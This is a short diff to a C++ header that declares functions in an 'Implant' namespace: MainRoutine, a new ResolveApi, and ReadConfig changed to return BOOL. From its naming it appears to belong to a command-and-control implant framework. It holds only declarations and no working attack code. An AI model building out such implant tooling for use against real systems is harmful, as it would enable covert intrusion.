@@ -7,6 +7,7 @@ EXTERN_C FUNCTION VOID Entrypoint(HMODULE Base);
 
 namespace Implant {
     FUNCTION VOID MainRoutine();
-    FUNCTION VOID ReadConfig();
+    FUNCTION BOOL ResolveApi();
+    FUNCTION BOOL ReadConfig();
 }
 #endif //HEXANE_CORELIB_BASE_HPP
